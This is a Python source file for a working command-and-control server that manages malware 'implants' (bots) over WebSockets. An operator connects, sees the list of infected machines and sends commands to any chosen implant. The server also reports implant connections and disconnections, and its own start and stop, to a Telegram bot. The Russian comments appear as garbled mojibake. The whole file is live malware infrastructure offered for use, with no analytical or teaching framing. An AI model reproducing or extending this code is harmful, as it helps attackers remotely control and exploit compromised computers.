#
# --- –§–∞–π–ª: c2_server.py (–§–∏–Ω–∞–ª—å–Ω–∞—è –í–µ—Ä—Å–∏—è V-STABLE) ---
# –≠—Ç–∞ –≤–µ—Ä—Å–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ –¥–µ—Ä–∂–∏—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –æ—Ç–∫—Ä—ã—Ç—ã–º–∏.
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

# --- –§—É–Ω–∫—Ü–∏–∏ Telegram –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ---
def send_telegram_message(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except: pass
    threading.Thread(target=send).start()

IMPLANTS, OPERATOR = {}, None

# --- –ì–õ–ê–í–ù–´–ô –û–ë–†–ê–ë–û–¢–ß–ò–ö –° –ò–°–ü–†–ê–í–õ–ï–ù–ù–û–ô –õ–û–ì–ò–ö–û–ô ---
async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(); await ws.prepare(request)
    client_id, client_type = None, None
    try:
        initial_message = await ws.receive_json()
        client_type = initial_message.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            await broadcast_bot_list() # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ –±–æ—Ç–æ–≤ —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
            # --- –û–°–ù–û–í–ù–û–ô –¶–ò–ö–õ –û–ñ–ò–î–ê–ù–ò–Ø –ö–û–ú–ê–ù–î –û–¢ –û–ü–ï–†–ê–¢–û–†–ê ---
            # –≠—Ç–æ—Ç —Ü–∏–∫–ª –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å, –ø–æ–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–µ –∑–∞–∫—Ä–æ–µ—Ç—Å—è.
            while not ws.closed:
                msg = await ws.receive()
                if msg.type == web.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id].send_str(json.dumps(data['payload']))
                elif msg.type == web.WSMsgType.ERROR:
                    break

        elif client_type == 'implant':
            client_id = initial_message.get('id')
            IMPLANTS[client_id] = ws
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
            await broadcast_bot_list()
            # --- –û–°–ù–û–í–ù–û–ô –¶–ò–ö–õ –û–ñ–ò–î–ê–ù–ò–Ø –ü–ò–ù–ì–û–í –û–¢ –ò–ú–ü–õ–ê–ù–¢–ê ---
            # –≠—Ç–æ—Ç —Ü–∏–∫–ª —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ–∫–∞ –∏–º–ø–ª–∞–Ω—Ç –Ω–µ –æ—Ç–∫–ª—é—á–∏—Ç—Å—è.
            while not ws.closed:
                msg = await ws.receive()
                if msg.type == web.WSMsgType.TEXT and msg.data == 'ping':
                    await ws.send_str('pong')
                elif msg.type == web.WSMsgType.ERROR:
                    break

    except asyncio.CancelledError:
        pass # –ù–æ—Ä–º–∞–ª—å–Ω–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ
    except Exception:
        # –≠—Ç–∞ –æ—à–∏–±–∫–∞ —Ç–µ–ø–µ—Ä—å –±—É–¥–µ—Ç —Å—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Ä–µ–∞–ª—å–Ω—ã—Ö –ø—Ä–æ–±–ª–µ–º–∞—Ö
        pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def http_handler(request): return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application(); app.router.add_get('/', http_handler); app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app); await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', settings.LOCAL_C2_PORT)
    await site.start()
    print("====== C2 –°–ï–†–í–ï–† (V-STABLE) –ó–ê–ü–£–©–ï–ù ======"); send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except: send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")